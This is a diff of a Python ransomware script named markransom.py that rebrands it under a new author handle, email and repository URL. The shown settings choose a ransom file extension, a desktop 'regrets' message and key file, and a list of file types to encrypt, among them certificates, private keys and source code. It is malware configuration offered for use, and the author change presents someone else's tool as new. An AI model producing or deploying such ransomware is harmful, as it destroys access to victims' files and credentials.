@@ -1,13 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 # markransom.py - decipher
-# https://www.github.com/R3nt0n/markransom
+# https://www.github.com/allesafe-com/markransom
 
 
-__author__ = "r3nt0n"
+__author__ = "hidd3n"
 __license__ = "GPL 3.0"
 __version__ = "1.0.0"
-__email__ = "r3nt0n@protonmail.com"
+__email__ = "ceykip@aruba.it"
 __status__ = "Development"
 
 
@@ -25,16 +25,16 @@ from lib.cryptor import find_root_paths, find_files_and_do
 # CUSTOM SETTINGS
 ################################################################################
 # This is just an example. You can set this variables to configure the script
-# https://github.com/r3nt0n/markransom
+# https://github.com/allesafe-com/markransom
 # Name to show in the desktop message as author
-JOKER = 'r3nt0n'
+JOKER = 'hidd3n'
 # Extensions to encrypted files
-CUSTOM_EXT = '.r3nt0n.crypted'
+CUSTOM_EXT = '.hidd3n.crypted'
 # File names to desktop message and decryption key. Set False to don't create it
 MSG_FILE = 'regrets.txt'
 KEY_FILE = 'key'
 # Message to write in the desktop file
-MSG = '\nThe key-file is on your desktop. {} just kidding you.\nFind decipher and instructions at https://github.com/r3nt0n/markransom.'.format(JOKER)
+MSG = '\nThe key-file is on your desktop. {} just kidding you.\nFind decipher and instructions at https://github.com/allesafe-com/markransom.'.format(JOKER)
 # Extensions to search and encrypt
 #EXTENSIONS = ['.pdf', '.doc', '.docx', '.txt', '.png', '.jpg']
 EXTENSIONS = ['.wb2', '.psd', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt','.cer', '.der', '.pl', '.py', '.lua',
